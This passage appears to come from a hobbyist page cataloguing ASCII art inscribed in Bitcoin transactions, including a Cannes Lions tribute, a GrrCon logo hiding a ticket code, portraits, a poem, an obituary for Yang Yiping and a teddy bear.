- [tx eda919b0a61b91c1fb030e6af314dfe5aaa6198416bfdaf8599d7f1a80c5d614](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0526.txt) block 526446 ([2018-06-07](https://www.blockchain.com/explorer/transactions/btc/eda919b0a61b91c1fb030e6af314dfe5aaa6198416bfdaf8599d7f1a80c5d614)) starts an [ASCII art](#ascii-art) spread across several transactions on different lines. Lines are completely scrambled, so either there is an index somewhere, or it was meant as a puzzle. This is the best we've managed to unscramble so far:<a id="_130"></a>

  ```
  ................................................................................
  ..............................@(..@@@@@@%@@,.@@@@@@@............................
  ........................@@@@..@@@@@(..@@@@@@@(.@@@@@@..@@@@@@@.@@@@..@..........
  ......................@.@@@@..,..........@@@@@@...@@@#..@@@@@@@..@@@.@@@........
  ....................@@@.@@@@..@....../......@@@@&..@@@..@@@@@@@@.@@@@.@@@.......
  ...................@@@..@@@...@..&@..@@........@@@%@@@..@@@@@@@@..@@@@@@@@......
  ...................@@..@@@..../&.@@@@@@@........@@@@@@..@@@@@@@..,@@@@@@@.......
  ..................@@..@@@@....@..@.@@.@@@.......@@@@@@.@@@@@@@...@@@@@@@........
  ..................@@..@@@@...@........@@@@......@@@@@@@@@@@@@..@@@@@@@@.........
  ...................@@@#.@@@@.,...................@@@@@@@@@@@@@@@@@@@@...........
  ....................@@@@.@@@@.@@............@.@@@&.....@@@@@@@@@@@@@............
  .....................@@@..@@@@.@@@........@.@@@.@@@@@@@@@,..@@@@@@@@............
  .....................@@@@...@@..@@@......@@@.@@@@@..@@@@@@@@..@@@@@.............
  .....................#@@@@@..@@..@@@@@@@@@@@.@@@@@@@..@@@@@@@.(@@@..............
  ......................@@@@@@@@@...@@@@@@@@..@@@@@@@@@..@@@@@..@@@...............
  ........................@@@@@@@@@........@@@@@@@@@@@..@@@@..@@..................
  ...........................@......%@@@@@@@@@@@@@@@@@@@@@@@@@....................
  ...............................@@@@@@@@@@@@@@@@@@@@@@@@@........................
  ..............................@@@@@@@@@@@@@@@@@......@@@........................
  ..............................@@@@.....@@@@@@...................................
  .............................@......@@@@@@................#@@@@@@@@@@@..........
  ..................................@@@@@@...............@@@@@@@..................
  ................................@@@@@................@@@@@@@....................
  .............................@@@@@.................@@@@@@@......................
  ...........................@@@@@.................@@@@@@@........................
  ........................*@@@@..............,@@@@@@@@@@@.........................
  ......................@@@@..........@@@@@@@@@@@@@@@@............................
  .........@@@@.....@@@@@........*@@@@@@@@@@@@(...................................
  ........@@@@@@@@@@@.........@@@@@@@@/...........................................
  ......@..@@@....@@@.......@@@@@@................................................
  .....@@@@@.@@#..........@@@@@...................................................
  ......@@@@@@@@@@@@@@@@@@@@......................................................
  ...................................................................===========/.
  .........................................................==========..........//.
  ................................................=========..................../..
  .........................................=======...........//XX...XXXXXXX...//..
  ...................................======.........XX..XXXXXXXXX.XXX........./...
  .........................=========........XXX....XXX..XXXX.......XXXXXXXXX..\...
  ...............==========............XXX.XXXXX...XXX..XXXXXXXXX....XXXXXXX..\\..
  \=============/..............XXXX....XXX.XXXXXX..XXX..XXX.......XXXX..XXXX...\\.
  \\..................XXXX.....XXXXXX..XXX.XXX.XXXXXXX..XXX../XXX..XXXXXXX.....\\.
  .\......XXXXXX......XXXXX....XXX.XXX.XXX.XXX...XXXXX..XXXXXXX................//.
  .\\...XXX...XXX....XXXXXXX...XXX..XXXXXX.XXX....\XXX....====================/...
  .\\..XXX..........XXX..XXX...XXX....XXXX.XX=....=======/........................
  ../..XXX..........XXXXXXXXX..XXX............===/..######...###...###..####......
  .//..XXX....XXX..XXX.....XXX.X......======//......#...##.###.###..##.##..##.....
  .//...XXXXXXXX..XXX.........======//................###..##...##..##..####......
  ./.................=======//......................###....###.###..##.##..##.....
  /================//..........T.I.T.A.N.I.U.M......######...###....##..####......
  ................................................................................
  ..................Duncan.Marshall-Founding.Partner-Droga5-USA...................
  ..................Gail.Heimann-President-Weber.Shandwick-USA....................
  ..............Susan.Bonds-Co-Founder.&.CEO-42.Entertainment-GLOBAL..............
  .............James.McGrath-Creative.Chairman-Clemenger.BBDO-AUSTRALIA...........
  ............Fred.Raillard-Founder,.Chief.Creative.Officer-FF-GLOBAL.............
  ...........Eugene.Cheong-Chief.Creative.Officer-Ogilvy.&.Mather-APAC............
  ..........Colleen.DeCourcy-Chief.Creative.Officer-Wieden+Kennedy-GLOBAL.........
  .......Caitlin.Ryan-Regional.Creative.Director-Facebook.and.Instagram-EMEA......
  .......PJ.Pereira-Creative.Chairman.&.Co-Founder-Pereira.O'Dell-GLOBAL..........
  .Jason.Xenopolous-Global.Chief.Vision.Officer.&.Chief.Creative.Officer-VML-EMEA.
  ```

  At firs we thought it was some kind of tribute to the [Cannes Film Festival](https://ourbigbook.com/go/topic/cannes-film-festival), but given the string "Titanium" and the fact that all people mentioned on another section of the art work for advertisement companies, we understand that it is instead almost certainly about the "[Cannes Lions International Festival of Creativity](https://ourbigbook.com/go/topic/cannes-lions-international-festival-of-creativity)", previously "International Advertising Festival", which has a "titanium" prize category, e.g. as mentioned at: [https://www.thedrum.com/news/2018/06/22/cannes-lions-winners-titanium-glass-grand-prix-good-and-more](https://www.thedrum.com/news/2018/06/22/cannes-lions-winners-titanium-glass-grand-prix-good-and-more):<a id="_131"></a>
  > The highly coveted Titanium Lions - created to honor marketing work that doesn't fit neatly into traditional categories

  The part with the [at signs](linguistics.md#at-sign) '@' which we believe represents the lion is the hardest one and we've perhaps gotten some lines wrong, corrections are welcome.<a id="image-cannes-lions-logo"></a>
  <img src="https://web.archive.org/web/20240206110431if_/https://scontent.flpl1-1.fna.fbcdn.net/v/t39.30808-6/348255639_1459024094918099_2559641382320310664_n.jpg?_nc_cat=103&amp;ccb=1-7&amp;_nc_sid=efb6e6&amp;_nc_ohc=of0QCzYGTXUAX8epZyB&amp;_nc_ht=scontent.flpl1-1.fna&amp;oh=00_AfAB8sUiWHc3BpNd6yz6xFlkOVQO75jtcnL4-84kcxWZUQ&amp;oe=65C7E7A3" alt="" height="600">

  **[Figure 11](#image-cannes-lions-logo). Cannes Lions logo**. [Source](https://www.facebook.com/Cannes.Lions.Festival.of.Creativity). Off-chain, for ASCII art reference.
<a id="_132"></a>
- <a id="code-90b663f380ed043a0c35aaeed5405b260545df991fed4bfff3d1386ecb256ce1"></a>
  ``````````````
                      `...:.
                    `''''';';
                    '+'''+''''
                    `'''++++''''
                    ;'++++';;'++,
                    '+++++';;;''+,
                    '+++++;;;;;++;
                    '++++'';;;;;+':
  ::::::,,,,,,,,...`+'''';;;'';;;;;` `````````````
  ::::::::::::::::::';'''';+++';;';:::::::::::::,,,,
  :::::::::::::::::::''';;''+'';;';:::::::::::::::::
  :::::::::::::::::::;''++'''';;;'':::::::::::::::::
  :::::::::::::::::::;+++++';'''''+;::::::::::::;:::
  :::::::::::::::::::::;'+'''''++'';#';:::::::::::::
  ::::::::::::::::::'+++''''''+''++'+'+;::::::::::::
  :::::;:::::::::::'+++++''++++''++'#++'':::::::::::
  ;;;;::::::::::::'+###++#'+++'++++'#+#++'';::::::::
  ;::;;;;;:::::::'++++++++#+++++++++#+++++++';::::::
  ;;;::::;;;:;;;;++++'''''+####+++++##;++++++';:;:::
  :::;;;;;;;::::+##';''''''###+##++##+;++++++++':;::
  :::;;;;::::::;+#+';''''''###++###+#+;###+++++'':::
  :::::::::::::#+#'''';''''+###+++####;##++++++++':;
  ;;;;;;:::::;:++++''++'''+####+++++##;#+#++++++++':
  ;;;;:;:::::::#++'#++++##++#++++++++#'###+++####++;
  ::::::;;;;;;;+++''''++'+++@+++++++'####+#++#+++++;
  ;;;;;;;;;;;;;;+#';'''''+'+##'+++++'+#####+++++#++;
  ;;;;;;::;:::;:'++'''+''+++##++'+''+#########+++++:
  ;;;;;;;;;;;;;''++'++'''++##+'+##++#+##+#+++##++++;
  ;;;;;;;;;;;'''''#++''''++##+###'#######+####++++;;
  ;;;;;;;;;;;;''''+#++'+++###'#+;'##+####+++#+++++;;
  ;;;;;;::;;'''''+'+##++++###'#';###+##+####++++++;;
  ;;;;;;'++'''''++++#++++####'+;+##+###++####++++;;;
  ;;;;:+++''''++++++#####@###'+;######+#++###++++;;;
  ;;;';;#+'''+++++++########+'++######+++++++++++;;;
  ;;;::;'+'+++++++++########''++##+##+++++###++++;;;
  ;;:+;''+++++++++++#+#####+''#+#+###+++#####+++';;;
  ;'';;+''+++++++++++######'''+######+++++###+++;;;;
  ;';;'''+#+++++++++######+'';#++############++#:;;;
  ;'';''+'++##++++++++####+'''###@########++#++#;;;;
  ;''''''+@++++#++++++####''+'##############++#;;;;;
  ;''''''''++++++++++++###''+'##############+##;;;;;
  ;'''''''''++++++++++++##+'''##############+#+;;;;;
  ;;;;''''''+###+++####+######################;:;;;;
  ;;;;+''''''+##############+#################;:;;;;
  ``````````````
<a id="_133"></a>
- [tx 79947c26f8abc8d5c2a9b5442005a5426f35f436119b3092f59e6fe3fad80df1](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0530.txt#L439) block 530614 ([2018-07-05](https://www.blockchain.com/explorer/transactions/btc/79947c26f8abc8d5c2a9b5442005a5426f35f436119b3092f59e6fe3fad80df1)) has this [lolcat](https://ourbigbook.com/go/topic/lolcat):<a id="_134"></a>

  ```
  lolcat test |\---/|
              | o_o |
              \_^_/0
  ```
<a id="_135"></a>
- <a id="_136"></a>
  [tx f8102999c0aaf7681deec383eb8e7946f093e94a116a21e367e9ed6b7c32d1fb](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0538.txt#L94) ([2018-08-23](https://www.blockchain.com/explorer/transactions/btc/f8102999c0aaf7681deec383eb8e7946f093e94a116a21e367e9ed6b7c32d1fb)) contains the logo of the [GrrCon](https://grrcon.com/), an annual [cybersecurity](computer.md#cybersecurity) conference with message:<a id="_137"></a>


  > Your free GrrCon ticket

  The actual code appears to be:<a id="_138"></a>


  > OPRETURNISMYFRIEND

  a reference to [OP\_RETURN](cryptocurrency.md#op-return). It is [steganographically](cryptography.md#steganography) encoded diagonally across the skull's eyes. [Ciro Santilli](ciro-santilli.md) only saw this after grepping:<a id="_139"></a>

  ```
  grep @ data/out/0538.txt
  ```
  which made all non `@` signs stand out due to the terminal's syntax highligh. This image was uploaded one line per transaction with a few interruptions that we removed manually, and there were was a previous partial attempt a bit before: at tx f8102999c0aaf7681deec383eb8e7946f093e94a116a21e367e9ed6b7c32d1fb so either a failure, or maybe it was intentional to obfuscate things a bit.<a id="code-your-free-grrcon-ticket"></a>

  ```
  @@@@@@@@@@@@@@@@@@@@@@@@YOUR@FREE@GRRCON@TICKET@CODE@@@@@@@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,          *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@@@@%                          @@@@@@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@                                   .@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@          *@@@@@@@@@@@@@@@@@@@,           @@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@         @@@@(                   %@@@@          @@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@       @@@@                             @@@&        @@@@@@@@@@@@@
  @@@@@@@@@@@@       @@@        @@@@@@@@@@@@@,@.           @@@        @@@@@@@@@@@
  @@@@@@@@@@      %@@       .&@@@@@@&%@@@@@&&&@@@@@#          @@/      /@@@@@@@@@
  @@@@@@@@@      @@       @@@&@@O@@@@@@@@@@@@@@@@(@@@@&         @@       @@@@@@@@
  @@@@@@@@     @@.      .@@@,%&@@P@@@@@(,*&*@@@@@@@@#(#.@        (@@      @@@@@@@
  @@@@@@*     @@       @@(@%@@@@@&R@@@@&@@@@@@@&@@@@@@/ @@@        @@      @@@@@@
  @@@@@#     @@       @@@@@@@@,,@%@E@%@@@@@@@@@@@%@@@@@.@@@@        @@      @@@@@
  @@@@@     @@        @.@@@@@,@@@(@,T@@@@@@@@@@@@@@@@@@@@@@@@        @@      @@@@
  @@@@     @@        @&@@@@@@/@#@(@&@U@@@@@@@@(@@@@@@., #@@@@@        @@      @@@
  @@@*    @@         @@@@&@@&@    #@@@R@.@@@@@.@@@@@@@%@@(@@@@@        @@     @@@
  @@@     @@         /@@*@@        @@@/N/@,@@@@@@@@@    @@@@@@,        @@      @@
  @@@    @@          @@@@@          @@.@I@@,@@@@@@@@    @@@@&@@         @@     @@
  @@/    @@           @@@,           (#@/S@@@@@@.,@     **@@&,@         @@     @@
  @@     @@           %((           @#@@@@M@@@@@&@    #./%&@@*          @@     %@
  @@     @@           #&&@          @@@@&@@Y@@@@@     &@,@@@.(          @@     %@
  @@,    @@           @@@@@@        *(@@%@@@F&@.      @@&%@@            @@     @@
  @@@    @@           @#@%@/@         @@@*@@@R(      @@@&@              @@     @@
  @@@     @@         @@@@@@@@@%@@@%%@@@@@@@%%/I@  @@@@, @              @@      @@
  @@@.    @@         @@@@@@@*@&@@@@# @(@@@@@@@@E@@@@@@@&               @@     @@@
  @@@@     @@         @@@@&@@(@@@@@@.@# @@@ @@@@N@@@@,@(              @@      @@@
  @@@@@     @@            @@@*@@&@@*(@  @@@&@@&@@D@@@@&              @@      @@@@
  @@@@@.     @@                  @/@,@@@@@@@@@@@@@@%                @@      @@@@@
  @@@@@@      @@                 @@@@@@@@@@@@@,@@@@                @@      %@@@@@
  @@@@@@@,     @@/             @&@@(@@@@ @@@@@@@@@               &@@      @@@@@@@
  @@@@@@@@@      @@          #%@(,&,@@@@ @(&  @/,@              @@       @@@@@@@@
  @@@@@@@@@@      /@@        @@&@@@@@,*  @@&  @@@@@@         .@@.       @@@@@@@@@
  @@@@@@@@@@@@       @@@        @(@@@@@@ @@@  .@(@@,       @@@        @@@@@@@@@@@
  @@@@@@@@@@@@@@       &@@@                             @@@#        @@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@         @@@@@                   @@@@@          @@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@#          .@@@@@@@@@@@@@@@@@@@            @@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@         @  ,        .  @           @@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@@@@     @ @   @#   @  *, @     @@@@@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  ```

  <a id="_140"></a>
  Without `@`s to better highlight the code:<a id="_141"></a>

  ```
                          YOUR FREE GRRCON TICKET CODE
                                    ,          *
                            %
                                                           .
                               *                   ,
                               (                   %
                                                           &
                                             , .
                  %         .&      &%     &&&     #            /      /
                             &  O                (    &
                 .      .   ,%&  P     (,*&*        #(#.         (
        *                ( %     &R    &       &      /
       #                      ,, % E %           %     .
                       .     ,   ( ,T
                      &      / # ( & U        (      ., #
     *                   &  &     #   R .     .       %  (
                     /  *             /N/ ,                   ,
                                      . I  ,                &
    /                    ,           (# /S      .,      **  &,
                      %((            #    M     &     #./%&  *                 %
                      #&&               &  Y          & ,   .(                 %
    ,                               *(  %   F& .        &%
                       # % /             *   R(         &
                              %   %%       %%/I       ,
     .                      * &    #  (        E       &
                          &  (      . #         N    , (
                             *  &  *(      &  &  D    &
       .                          / ,              %
                                              ,                            %
         ,       /              &  (                             &
                             #% (,&,      (&   /,
                  /            &     ,*    &                 .  .
                                 (            . (  ,
                       &                                   #

                    #          .
                                    ,        .
                                        #      *,
                                  &
  ```
  <a id="image-grrcon-logo"></a>


  <img src="https://web.archive.org/web/20231222171731im_/https://grrcon.com/wp-content/uploads/2022/11/GrrCON_Skull2.png" alt="" height="600">

  **[Figure 12](#image-grrcon-logo). GrrCON logo**. Off-chain ASCII art reference.
<a id="_142"></a>
- <a id="code-ascii-art-of-two-low-resolution-faces"></a>
  ```
    .,:x, .. ..;   'll' .;c;,..      ...'...::;;':coc.'o0xxxO00Ox;l:,',l.,;,,;c
      :'x;.'':::c;,..::,;ddddl:;'.   .':.'...,;:c,:,:.:''0kkk0000k'.   .l,,:;;c:
      c'kcckOOkxdl:;:clokOOkkxdolc:,..;..,';';cc:;c:l.'..xkxxOO0Ox'...,:ldc:.''.
  ...c:xOKKKKKOxocodxOKKKK00Okddl::;'. ..;'''cl.'ldxxdlcolddddoll:,;;',,d:;'...
  ..  cxOKXNNXXOxkxk0KKOOO00OOkxdolcc;,'. ,'..'ooOKKOkolk00000OkkkOkdl:'.c''...,
      :0XNNNNXO00KKKKK000kdk0OOOOOOxoc;,:'...;dKKXKKOxok0XXXXXKKXXKK0kxlccc'.,,'
    lOOXXNNXKKKKK0OkxdkOKOox00KXXNNXXKOdl',dKKKKKKK0kxxOXXNXX0OxlcllodkOkxc';;:
    cKO0XNNX0kddolccc::cldxxdOKXXXNNNNXOkxoNNNNNNNNNXK0Oxxkkxoc:;,,'...':x0Oc,,;
  .'0KKKXKOdlcc:::::::;;::cccclloxOKXNNNOxKWWWWNNNNKOxdoocc:::;;;,,'...  .ckOl';
  .dKXK0Kklcccc::::::::::;;;;;;,,,:ld0XNXXXWWWNNNKxolcc::::::;;;,,'...     ;xOc
  0KKO0klc:::::::::::::::;;;,,...,:coOXXXNWWWNXOdlllcccc::::;;;;,,,''..... ,kx;
  ,KXKKOdcc:::::;;;;::::;;;,''...',;:cxKNXWWWNXOxdoollcc:::::::::::clxkkdlc;..o,
  lXXKOolcc::::::;;;;;;;;;,'......,;:cd0NNWWWX0xddoolllcccccccccccokOOkxdol:. 'c
  'KXklcc::::::cc::::;;:;;;;,',,',;;:lokXNWWWXOkddoollllooodoolcccoxk0KKkd:;...;
  kNxllooddxddooooollllllcc:,,,;;;;;cod0NWWWNKOxdooloxO0000Okdl:;oodxxdol:,'.
  ;d0kdOO0000KKKKK0OkxoooxkkkkkxxdddlloxkXWWWWN0kdxk0K000KKKK0Oxl::;;clc:;,,...
  .k0OOxO0KKKXNNXXXK0xlccxKXXKKK00OOOOOxkNWWWWWX000OO0KXXOkOOxkddl:....;;;,'....
  ddklxodxkkO0000000KkoloO0KKKXXXKK00OkO0XWWWWWXK000KK00Okxxxdxxxoc,..'lolc::;,.
  xodlodllllodddddxOkl:,,dOxkkkkkxxddddO0NN0KWWWXK0OOkkxddoooodkkxl:;...:ddolc:;
  dllollooooooooodxocc:''cddllllllllloxxONNlcNWWNK0xdddoolllloxOxkxolc;:lccodxdl
  O0ddooolllllloooolc::,';cddolllloodddxKXNdk0NNNX0kxddoolllooxOO0KK0kooc:::ldxo
  NNNdddlllllllodolllccc::cldollllllodxO0K0dxxk0XNX0OkxxddooodxxkOOOkxolcccooooo
  NNNxxxdooooodddk0K0kxkkOOxddoloooodxk00OxdxxxxxOXX00OkkxxdddxdxxxxkkkOkxoc::cc
  NXKkxxkxdddddoodxkO0KKOkkdoodddoodxkOkkxxxxxxxxxxOK0000Okkxxxk00KK0Okxxxoc:;;,
  XKXKxxkkxxxddddddxxkOOxddoooododdxkOOdxddddddoooddddk0K00OkxxkkkkOOOkkxdlc;,'.
  KXXW0OkOkk000OOOOOOOkkOkxxxOkkxxxkkOdoooooolooolooodxk0K000OOkkkxxxxdollc:;,,'
  KXXWWX0O0OkOkOOO0O000OO00OOkOOkkOOOdooolooooddooooodxdxKKKK000OOkxddoollllccco
  KXXWWWNK0KOOkxxxkOOOOOkxddoodxOO0OdddddddoddoddoddodxodXNNNXKK000OOkxxdddxxkKX
  KXWWWWWWNKKOkkxxxxxxxxxxdddxxOO0XXdlloodolooddodldooxox0XNNWNNNNXXXXKKKKXXXXXK
  XWWWWWWWWWXKOkxdoooooooooodxO0XWWWOloodolddddololllloOXWNNNNNNNNNNNNNNWWXXXXKK
  WWWWWWWWWWWWX0Okkxxxxddddxk0KXWWWWXdcooocllllll::ccoXWWWWNNNNNWWWWNNNNNNXXKKKK
  WWWWWWWWWWWWWWXKKK000OOO0KXNWWWWWWNOlllollocl:lllkXNWWWWWNNNNNNNNNNNNXXXKKKKKK
  WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNWWWNXloccxdxkoldOXNWWWWWWWWNNNWNNNNNNNNXXXXXXXX
  ```
<a id="_143"></a>
- <a id="code-ascii-art-of-face-of-woman-with-short-hair"></a>
  ```
  kkkkkkkkkkkkkOOOO0000OOOkdc:,''...  ............';oooodxdx0K0OKKXXXXKKNNNWWWNW
  kkkOOOOOOOkkOOOO000K00Oxc;'.''...  ...............':lodOxxKK000KKKKKKXNNWWWWWW
  0kkkkOOOK000000KKKKKKOl;,'...,'..  '.     ..........,ckKdx000000KKKKXNNWWNNWWW
  OOOOOOOOXNXXXXX0kkOxd:,'........  .,.      ...........cddk000000KXXNWWWWWWWWWW
  XXKXXXXXKKKKKKKKKXKx;'....   .... .:.   ............. .;oOXNNNNWWWWWMWWMMMWMMM
  OOOOOOOOOOOOOO0OOOx;.. .      ....':..  ......  ...  . .,OXXXXXXXXXWWWNWWWWWWW
  xxxxxkkkkkkkkOOkkx:..       .';:c:,;;...'...      ..    .:k0000000XNNNNWWWWWWW
  xxxxxkkkkkOkkkO0Kd..      .,:odxxkkxkOxoc,.              .o00000KXNNNNNWWNWWWW
  xkxkkkkOOOOO00KOkc.      'clldxxxkkOO000Okxl:'.           ,kO000KNNNNNWWWNWWWW
  xkxxkkkO00KKK00Ok;.      ,loddxxxkOO0000OOkxxdl;.         .d00000XNNNNNNNNWWWW
  kkkkOO0KKK00OOOOk'.     .,:cldxxxkkkOOOOOOkxdlc:,..        o00OO00KXXXXXNNNWNN
  00KKXXXKKKKKKKKKO;      .;cc,'.'cldxxkxdoc,',cll:,;.     .'OKKKXXXXNWWWWWWWMMM
  NNNNNNWWWWWWWWWWNk    . ':c:cl;cdoclxkdlooo;ccclcc;.    ..x00KKKKXXXKKKKKXXKXX
  kkkkkkkkxxkkkddooo:. .. 'clllooodolcdxoodddddooolc;.   ...O00000000000OO000OOO
  xxxxxxxxddkkkxdolll:'.  .clooddxxolldxoodxkxxxdool;.  ..'.xxkkkkkkkOOOOOOOOOOO
  oooooodddodddol:;;;:..   ,loddxxxllldxlloxxkkxddoc;.   ..lXXNNNNNWWWWWWWWWWWWW
  oooooddddddxxxxdddxd..    ;lodxddccokxlolxddxxdoc:.    ..lONWWWWWWWWWWWWWWWWWW
  00000KKKKXXXXXXXXXXXl; .  .;colloollododdddllolc:,     .....:kNWWWWWWWWWWWWWWW
  XXNNNNNNNNWWWWWWNNNXx,.    .;collcclodolllooolcc,      ...    .:xOOkkkkkxxxddd
  NNNNNNNXXXXKKKKKOkx'..  .   .':lolccccclodddol:'                .:lccccccccc::
  ooooooodddddddoc;'...   ....  .;loooddddxddlc;.           ..,:loool:::c:::::::
  lllllllllloll:,,'....... .      .:odddxdol;'.        ...'coooooooooo::::::::::
  ccccccccclcc;'''''..              .',;;'.                .';coolollod::::::;;;
  :::ccc::;;,.....                                              .',:cllo:::;;;;;
  :::,'.'...                                                         ..,c:;;;;;;
  ;......                                                               ..';;;;;
  ccc.                                                                     .,,,,
  cc.                                                                       .',,
  .,                                                                         .,,
  ```

  <a id="_144"></a>

  <a id="_145"></a>
  - [tx 1f23df23751bdd6c2e3ac138ed0de9d9a6b749c50d7da09d2c0a6d63ab237fe8 block 591520](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0591.txt#L1301) ([2019-08-24](https://www.blockchain.com/explorer/transactions/btc/1f23df23751bdd6c2e3ac138ed0de9d9a6b749c50d7da09d2c0a6d63ab237fe8)) contains a cute [ASCII art](#ascii-art) poem split one line per transaction as suggested by the poem itself:

  <a id="_146"></a>
  ```
  _______________________________________
  |         An immutable poem             |
  |    Unchanging over time, forever      |
  |   Written in transactions flowing     |
  |                                       |
  |     Unbroken blocks for a Rose        |
  |     That I found in September         |
  |   Freedom gives this simple prose     |
  |     For all our time together         |
  |                                       |
  |      Thank you for being you          |O
  |    Like this poem, it is forever      |,
  |     After all these years true        |
  |      I love our time together         |
  ```
<a id="_147"></a>
- <a id="_148"></a>
  [tx b8e80f2bd1eac8c6db4dfb8b6cc9c8eb71133cbc1a0d32e6952c1a2818eecc8f](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0652.txt#L1) block 652005 ([2020-10-09](https://www.blockchain.com/explorer/transactions/btc/b8e80f2bd1eac8c6db4dfb8b6cc9c8eb71133cbc1a0d32e6952c1a2818eecc8f)) contains the obituary for Yang Yiping, a [Christian](religion.md#christianism) [Chinese](china.md) lady who lived in [Germany](continent.md#germany):<a id="_149"></a>

  ```
         .-==-.
         |    |
         |    |
  .-====='    '=====-.
  |   Yang, Yiping   |
  *-====-.    .-====-*
         | 　 |
         | 杨 |
         | 　 |
         | 一 |
         | 平 |
         | 　 |
         | 　 |
         `-==-´
  *~~~~~~~~~~~~~~~~~~*
      Yang, Yiping
        杨 一平
  .~~~~~~~~~~~~~~~~~~.
    ✰ 1957-07-19
    ✞ 2020-10-08
  '~~~~~~~~~~~~~~~~~~'
  Wir vermissen dich!
   杨一平，
    我们思念你
     ヾ(￣▽￣)
      杨一平与
       耶稣在一起
  //yang.yiping.de/btc
  ```

  <a id="_150"></a>
  Translations:<a id="_151"></a>

  <a id="_152"></a>
  - Wir vermissen dich: We miss you
  <a id="_153"></a>
  - 杨一平: Yang Yiping
  <a id="_154"></a>
  - 我们思念你: We miss you
  <a id="_155"></a>
  - 杨一平与耶稣在一起: Yang Yiping is with [Jesus](religion.md#jesus)

  <a id="_156"></a>
  The link [https://yang.yiping.de/btc](https://yang.yiping.de/btc) is dead with no archives, but the toplevel [https://yang.yiping.de](https://yang.yiping.de) survives as of 2024 and contais an obituary in a [WordPress](website.md#wordpress) website. The Bitcoin message is acknowledged on the website at:<a id="_157"></a>


  > archiviert auf der BTC Blockchain TX b8e80f2bd1eac8c6db4dfb8b6cc9c8eb71133cbc1a0d32e6952c1a2818eecc8f

  The website is also mirrored at [https://yiping.de](https://yiping.de). The navigation is a bit confusing, but [https://yang.yiping.de/?cat=10](https://yang.yiping.de/?cat=10) contains a blog with many entries, presumably by her husband<a id="_158"></a>

  <a id="_159"></a>
  - the [first post](https://yang.yiping.de/?p=1324) is from slightly before her death on 2020-09-01 and documents their 2019 trip to [San Francisco](united-states.md#san-francisco) apparently to visit family. She could be a [COVID-19](taxonomy.md#covid-19) casualty.
  <a id="_160"></a>
  - [https://yang.yiping.de/?p=367](https://yang.yiping.de/?p=367) gives transliterated names of her three children: Kaibin, Ella and Martin
  <a id="_161"></a>
  - [https://yang.yiping.de/?p=638](https://yang.yiping.de/?p=638) has some mentions of work colleagues, but not enough to easily identify where she worked

  <a id="image-off-chain-image-of-yang-yiping"></a>
  ![](https://web.archive.org/web/20240206091158if_/https://yang.yiping.de/wp-content/uploads/2020/11/DSC01901-1024x576.jpg)

  **[Figure 13](#image-off-chain-image-of-yang-yiping). Off-chain image of Yang Yiping**. [Source](https://yang.yiping.de).

  <a id="_162"></a>
  A previous failed upload is present at: [tx b4ba91b4892ff85a5eb18b85bc1fd744d9418b2a71f1dc130447893b9e1cab60](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0651.txt#L584) block 651974 ([2020-10-09](https://www.blockchain.com/explorer/transactions/btc/b4ba91b4892ff85a5eb18b85bc1fd744d9418b2a71f1dc130447893b9e1cab60))

  <a id="_163"></a>
  The upload is done as [P2PKH](cryptocurrency.md#p2pkh) (20 bytes at a time) and is meant to show with newlines after each ouptut, [BitLen](#len-sassaman-tribute) style. It is also further broken down on our upload by the presence of [UTF-8](telecommunication.md#utf-8) characters. [brando2131 helped decoded this message on Reddit](https://www.reddit.com/user/brando2131/comments/1fy2aum/decoding_hidden_messages_on_the_bitcoin_blockchain/), after [Ciro Santilli](ciro-santilli.md) reached out for help after seeing his work on the [Code 9. "ZN inscription"](#code-zn-inscription).
<a id="_164"></a>
- [tx 0d034d6dc3cfa8c8ebb1df202ada251bdf890f9dd5f0c4dffbe185b8cc5c999d](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0669.txt#L565) block 669986 ([2021-02-10](https://www.blockchain.com/explorer/transactions/btc/0d034d6dc3cfa8c8ebb1df202ada251bdf890f9dd5f0c4dffbe185b8cc5c999d)) a teddy bear, also visible e.g. at [https://www.asciiart.eu/toys/teddy-bears](https://www.asciiart.eu/toys/teddy-bears)? ["xoxo" means hugs and kisses](https://en.wikipedia.org/wiki/Hugs_and_kisses). Maybe this was in preparation for St. Valentine's day a bit later on February 14th?<a id="_165"></a>

  ```
    ___
  {~._.~}
   ( Y )
  ()~*~()
  (_)-(_) xoxo, S
  ```
<a id="_166"></a>
- [tx 7076d9a40b44e92d8b96f9f5f1cb258619356d0789fe5bcf5197e2eaeb2b9eab](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0693.txt#L377) block 693550 ([2021-07-31](https://www.blockchain.com/explorer/transactions/btc/7076d9a40b44e92d8b96f9f5f1cb258619356d0789fe5bcf5197e2eaeb2b9eab)) contains what could be an obituary for a bird:<a id="_167"></a>

  ```
  YOU ARE
      _
      |o}=
      | (
    / /)
    /_//
  _/_//
  \/_'
  __LL
  SO FAT
  ```

  and tx b478c2a3566fa644ccb3c9da567f39c9030e337537610c9ff5c5c885ea6109b8 block 693776 appears to follow up on it:<a id="_168"></a>

  ```
    _    _
  /and\/so \
  | (o><-) |
  \//\ /\\
    V_/ \_V
    `\ / '
    loved
    Chris<3
  ```

  Cute.
<a id="_169"></a>
